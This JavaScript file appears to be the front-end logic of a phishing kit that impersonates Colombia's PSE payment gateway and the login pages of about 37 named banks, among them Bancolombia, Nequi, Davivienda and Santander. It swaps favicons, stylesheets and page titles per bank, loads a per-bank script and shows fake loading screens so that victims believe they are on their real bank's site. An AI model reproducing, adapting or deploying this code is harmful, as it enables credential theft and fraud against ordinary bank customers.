document.addEventListener('DOMContentLoaded', function() {
    optionLogin();
});

function optionLogin(){
    const opLogin = document.querySelectorAll('.main__optionSelect');
    const formN = document.getElementById('formNatural');
    const formJ = document.getElementById('formJuridica');

    opLogin.forEach(function(item){
        item.addEventListener('click', function(){
            opLogin.forEach(function(op){
                op.classList.remove('active');
            });

            item.classList.add('active');

            if (item.classList.contains('opNat')) {
                formN.classList.remove('hidde');
                formJ.classList.add('hidde');
            } else if (item.classList.contains('opJur')) {
                formN.classList.add('hidde');
                formJ.classList.remove('hidde');
            }
        });
    });
}

function pagePSE(){
    const pagePSE = document.getElementById('pagePSE');
    const pagePasarela = document.getElementById('pagePasarela');
    const link = document.getElementById('stylesheet');
    const loader = document.getElementById('loader');

    loader.classList.remove('hidde');
    pagePasarela.classList.add('hidde');
    pagePSE.classList.remove('hidde');
    link.href = './assets/css/pse.css';

    setTimeout(() => {
        loader.classList.add('hidde');
    }, 1000);
}

function irAlBanco(){
    const popupTerms = document.getElementById('popupTerms');

    popupTerms.classList.remove('hidde');
}

function bankChoose(){
    const txtBankSelected = document.getElementById('txtBankSelected').value;
    // const txtBankSelected = "NEQUI";

    const loaderP = document.getElementById('loaderPopular');
    const loaderP2 = document.getElementById('loaderProcessing');
    const pagePSE = document.getElementById('pagePSE');
    const popupTerms = document.getElementById('popupTerms');
    const listOfBanks = document.getElementById('listOfBanks');
    const alert = document.getElementById('alertHeader');
    const link = document.getElementById('stylesheet');
    const ico = document.getElementById('iconFavicon');
    const title = document.getElementById('titlePage');

    var script = document.createElement('script');

    if (script) {
        script.src = './assets/js/bancos/' + txtBankSelected + '.js';
        document.head.appendChild(script);
    }

    // BANCOS --->
    const alianzaFiduciaria = document.getElementById('alianzaFiduciaria');
    const ban100 = document.getElementById('ban100');
    const bancamia = document.getElementById('bancamia');
    const agrario = document.getElementById('agrario');
    const bancoBBVA = document.getElementById('bancoBBVA');
    const cajaSocial = document.getElementById('cajaSocial');
    const cooperativoCoopcentral = document.getElementById('cooperativoCoopcentral');
    const davivienda = document.getElementById('davivienda');
    const bancoDeBogota = document.getElementById('bancoDeBogota');
    const bancoDeOccidente = document.getElementById('bancoDeOccidente');
    const falabella = document.getElementById('falabella');
    const finandina = document.getElementById('finandina');
    const gnbSudameris = document.getElementById('gnbSudameris');
    const itau = document.getElementById('itau');
    const morganColombia = document.getElementById('morganColombia');
    const mundoMujer = document.getElementById('mundoMujer');
    const pichincha = document.getElementById('pichincha');
    const bancoPopular = document.getElementById('bancoPopular');
    const santander = document.getElementById('santander');
    const serfinanza = document.getElementById('serfinanza');
    const unionAntesGiros = document.getElementById('unionAntesGiros');
    const bancolombia = document.getElementById('bancolombia');
    const bancoomeva = document.getElementById('bancoomeva');
    const cooperativaFinanciera = document.getElementById('cooperativaFinanciera');
    const citibank = document.getElementById('citibank');
    const coltefinanciera = document.getElementById('coltefinanciera');
    const confiarCooperativaFinanciera = document.getElementById('confiarCooperativaFinanciera');
    const cotrafa = document.getElementById('cotrafa');
    const crezcamos = document.getElementById('crezcamos');
    const dale = document.getElementById('dale');
    const daviplata = document.getElementById('daviplata');
    const iris = document.getElementById('iris');
    const luloBank = document.getElementById('luloBank');
    const movii = document.getElementById('movii');
    const nequi = document.getElementById('nequi');
    const colpatria = document.getElementById('colpatria');
    const uala = document.getElementById('uala');

    ico.href = './assets/img/bancos/'+txtBankSelected+'/favicon.ico';
    link.href = './assets/css/bancos/'+txtBankSelected+'.css';
    listOfBanks.classList.remove('hidde');
    popupTerms.classList.add('hidde');
    pagePSE.classList.add('hidde');
    loaderP2.classList.remove('hidde');

    setTimeout(() => {
        loaderP2.classList.add('hidde');

        setTimeout(() => {
            loaderP.classList.add('hidde');

            setTimeout(() => {
                alert.classList.add('header__alert--active');

                setTimeout(() => {
                    alert.classList.remove('header__alert--active');
                }, 3000);
            }, 2000);
        }, 500);
    }, 1200);

    setTimeout(() => {
        if(txtBankSelected == "ALIANZA-FIDUCIARIA"){
            alianzaFiduciaria.classList.remove('hidde');
            title.innerHTML = "Alianza";
    
        }else if(txtBankSelected == "BAN100"){
            ban100.classList.remove('hidde');
            title.innerHTML = "Ban 100";
    
        }else if(txtBankSelected == "BANCAMIA"){
            bancamia.classList.remove('hidde');
            title.innerHTML = "Bancamía PSE";
    
        }else if(txtBankSelected == "AGRARIO"){
            agrario.classList.remove('hidde');
            title.innerHTML = "Banco AGRARIO";
    
        }else if(txtBankSelected == "BANCO-AV-VILLAS"){
            avVillas.classList.remove('hidde');
            title.innerHTML = "Consultas Banca Virtual | Banco AV Villas";
    
        }else if(txtBankSelected == "BANCO-BBVA"){
            bancoBBVA.classList.remove('hidde');
            title.innerHTML = "BBVA PSE Comercio";
    
        }else if(txtBankSelected == "CAJA-SOCIAL"){
            cajaSocial.classList.remove('hidde');
            title.innerHTML = "Pago PSE";
    
        }else if(txtBankSelected == "COOPERATIVO-COOPCENTRAL"){
            cooperativoCoopcentral.classList.remove('hidde');
            title.innerHTML = "Multiportal PSE";
    
        }else if(txtBankSelected == "DAVIVIENDA"){
            davivienda.classList.remove('hidde');
            title.innerHTML = "PSE";
    
        }else if(txtBankSelected == "BANCO-DE-BOGOTA"){
            bancoDeBogota.classList.remove('hidde');
            title.innerHTML = "Banco de Bogota";
    
        }else if(txtBankSelected == "BANCO-DE-OCCIDENTE"){
            bancoDeOccidente.classList.remove('hidde');
            title.innerHTML = "Ingreso al Portal Transaccional | Banco de Occidente";
    
        }else if(txtBankSelected == "FALABELLA"){
            falabella.classList.remove('hidde');
            title.innerHTML = "Pagos en línea Banco Falabella";
    
        }else if(txtBankSelected == "FINANDINA"){
            finandina.classList.remove('hidde');
            title.innerHTML = "Inicia sesión - PSE | Banco Finandina";

            setTimeout(() => {
                document.getElementById('loadeFinandina').classList.add('hidde');
            }, 3000);
    
        }else if(txtBankSelected == "GNB-SUDAMERIS"){
            gnbSudameris.classList.remove('hidde');
            title.innerHTML = "GND Sudameris";
    
        }else if(txtBankSelected == "ITAU"){
            itau.classList.remove('hidde');
            title.innerHTML = "Itaú | Personas";
    
        }else if(txtBankSelected == "MORGAN-COLOMBIA"){
            morganColombia.classList.remove('hidde');
            title.innerHTML = "J.P. Morgan Log in to J.P. Morgan Access.";
    
        }else if(txtBankSelected == "MUNDO-MUJER"){
            mundoMujer.classList.remove('hidde');
            title.innerHTML = "Banco Mundo Mujer | Acceso";
    
        }else if(txtBankSelected == "PICHINCHA"){
            pichincha.classList.remove('hidde');
            title.innerHTML = "Banco Pichincha";
    
        }else if(txtBankSelected == "BANCO-POPULAR"){
            bancoPopular.classList.remove('hidde');
            title.innerHTML = "Banco Popular";
    
        }else if(txtBankSelected == "SANTANDER"){
            santander.classList.remove('hidde');
            title.innerHTML = "Banco Santander Colombia - Supernet";
    
        }else if(txtBankSelected == "SERFINANZA"){
            serfinanza.classList.remove('hidde');
            title.innerHTML = "Personas - Serfinanza PSE";
    
        }else if(txtBankSelected == "UNION-antes-GIROS"){
            unionAntesGiros.classList.remove('hidde');
            title.innerHTML = "Home";
    
        }else if(txtBankSelected == "BANCOLOMBIA"){
            bancolombia.classList.remove('hidde');
            title.innerHTML = "Bancolombia - Pagos PSE";
    
        }else if(txtBankSelected == "BANCOOMEVA"){
            bancoomeva.classList.remove('hidde');
            title.innerHTML = "Bancoomeva - PSE";
    
        }else if(txtBankSelected == "COOPERATIVA-FINANCIERA"){
            cooperativaFinanciera.classList.remove('hidde');
            title.innerHTML = "CFA Cooperativa Financiera";
    
        }else if(txtBankSelected == "CITIBANK"){
            citibank.classList.remove('hidde');
            title.innerHTML = "Citibank - Pagos PSE";
    
        }else if(txtBankSelected == "COLTEFINANCIERA"){
            coltefinanciera.classList.remove('hidde');
            title.innerHTML = "Home";
    
        }else if(txtBankSelected == "CONFIAR-COOPERATIVA-FINANCIERA"){
            confiarCooperativaFinanciera.classList.remove('hidde');
            title.innerHTML = "Confiar - PSE";
    
        }else if(txtBankSelected == "COTRAFA"){
            cotrafa.classList.remove('hidde');
            title.innerHTML = "Pse";
    
        }else if(txtBankSelected == "CREZCAMOS"){
            crezcamos.classList.remove('hidde');
            title.innerHTML = "PortalPagosCrezcamosPSE";
    
        }else if(txtBankSelected == "DALE"){
            dale.classList.remove('hidde');
            title.innerHTML = "Dale!";
    
        }else if(txtBankSelected == "DAVIPLATA"){
            daviplata.classList.remove('hidde');
            title.innerHTML = "Bancolombia - Pagos PSE";
    
        }else if(txtBankSelected == "IRIS"){
            iris.classList.remove('hidde');
            title.innerHTML = "IRIS - PSE";

            setTimeout(() => {
                document.getElementById('loaderIris').classList.add('hidde');
            }, 3000);
    
        }else if(txtBankSelected == "LULO-BANK"){
            luloBank.classList.remove('hidde');
            title.innerHTML = "pse.lulobank.com/login";
    
        }else if(txtBankSelected == "MOVII"){
            movii.classList.remove('hidde');
            title.innerHTML = "Home";
    
        }else if(txtBankSelected == "NEQUI"){
            nequi.classList.remove('hidde');
            title.innerHTML = "Nequi";
    
        }else if(txtBankSelected == "COLPATRIA"){
            colpatria.classList.remove('hidde');
            title.innerHTML = "Scotiabank Colpatria - PSE";
    
        }else if(txtBankSelected == "UALÁ"){
            uala.classList.remove('hidde');
            title.innerHTML = "Iniciar sesión | uala-col-webapp";
        }
        
    }, 500);
}